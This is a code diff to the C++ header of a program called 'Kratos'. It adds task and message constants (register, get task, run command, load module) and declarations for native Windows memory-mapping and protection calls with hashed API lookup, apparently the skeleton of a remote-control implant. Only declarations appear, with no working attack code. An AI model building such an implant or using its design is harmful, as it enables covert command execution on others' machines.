@@ -22,12 +22,33 @@
 
 #define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
 #define ALLOC_ARGS LMEM_FIXED | LMEM_ZEROINIT
+
+// Post message headers
 #define MSG_GETTASK  0x1
 #define MSG_REGISTER 0x2
 #define MSG_OUTPUT   0x3
 
-
+// Post response 
 #define RESP_NO_TASKS 0xa1
+
+
+
+// Task IDs
+#define TASK_LOAD_MODULE 0xb1
+#define TASK_LIST_MODULES 0xb2
+#define TASK_RUN_CMD      0xb3
+
+
+#define OUTPUT_NO_PARSE 0xc1
+
+// Error Ids
+#define ERROR_MODULE_LOAD_FAILURE 11
+#define ERROR_MODULE_LOADED       10
+
+
+// Success IDs
+#define TASK_SUCCESS_NO_OUTPUT 0xf3
+#define SUCCESS_MODULE_LOAD 0xb1
 
 
 #define DECL( x ) decltype( x ) * x
@@ -36,6 +57,11 @@
 #define HASH_STRW( x ) api::HasherW( ( x ) )
 
 class Kratos {
+private:
+	void moduleLoad();
+	void moduleUnload();
+	void moduleList();
+
 public:
 	struct Apis {
 
@@ -63,6 +89,8 @@ public:
 		DECL(NtQueryInformationProcess);
 		DECL(NtCreateSection);
 		DECL(NtMapViewOfSection);
+		DECL(NtProtectVirtualMemory);
+		DECL(NtFlushInstructionCache);
 	};
 
 	struct Dlls {
@@ -87,6 +115,8 @@ public:
 	BOOL Init();
 	BOOL LoadApis();
 	BOOL Run();
+
+	BOOL Dispatch();
 };
 
 extern Kratos* kratos;
